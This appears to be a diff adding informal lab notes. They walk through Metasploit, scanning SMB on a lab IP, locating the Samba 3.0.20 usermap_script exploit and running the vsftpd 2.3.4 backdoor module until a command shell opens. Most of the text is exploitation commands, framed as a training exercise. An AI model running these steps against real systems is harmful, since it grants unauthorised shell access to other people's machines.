@@ -1,0 +1,67 @@
+Go to kali terminal > and enter a command (msfconsole)
+msfconsole
+use auxiliary/ scanner/smb/smb_version
+show options
+set RHOSTS 172.16.6.117
+run
+
+
+Open new terminal in kali > enter a Command searchsploit samba | grep 3.0.20
+In Msf6 terminal > enter a Commad > grep samba search username map script 
+>use 1
+> then enter Show options
+
+
+or
+
+
+✅ Step 1: Start Metasploit
+
+Run:
+
+msfconsole
+
+
+(wait for it to load)
+
+🔍 Step 2: Search for an Exploit
+
+Example (FTP vulnerability):
+
+search vsftpd
+
+
+You’ll see:
+
+👉 exploit/unix/ftp/vsftpd_234_backdoor
+
+📌 Step 3: Use the Exploit
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+📌 Step 4: Set Target (demo IP)
+
+For lab demo (localhost):
+
+set RHOST 127.0.0.1
+
+
+(or vulnerable VM IP if you have one)
+
+🚀 Step 5: Run Exploit
+run
+
+
+or
+
+exploit
+
+✅ Step 6: Successful Exploitation (Demo)
+
+If vulnerable:
+
+You’ll get:
+
+Command shell session opened
+
+
+👉 This means system exploited.
